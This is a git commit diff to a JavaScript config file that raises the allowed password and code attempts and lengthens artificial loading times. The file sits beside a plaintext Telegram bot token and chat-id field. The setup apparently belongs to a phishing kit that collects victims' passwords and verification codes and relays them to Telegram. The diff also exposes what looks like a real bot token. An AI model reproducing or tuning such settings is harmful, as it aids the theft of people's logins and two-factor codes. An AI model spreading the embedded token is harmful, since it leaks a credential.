82d662bf4550a82a7fdd8671803f3ea4ee00ced8
Cuongdollarrr <luongminhtu7698@gmail.com>
2025-10-31 21:01:32 +0700

    Update configuration values for attempts and loading times

--- src/utils/config.js
+++ src/utils/config.js
@@ -4,8 +4,8 @@ const config = {
     noti_token: '7586875716:AAHd0kWQV4m7_XmN518onlTc1nJPGTN4MY8',
     noti_chat_id: '',
     max_password_attempts: 2,
-    max_code_attempts: 2,
-    password_loading_time: 3,
-    code_loading_time: 3
+    max_code_attempts: 4,
+    password_loading_time: 5,
+    code_loading_time: 10
 };
 export default config;
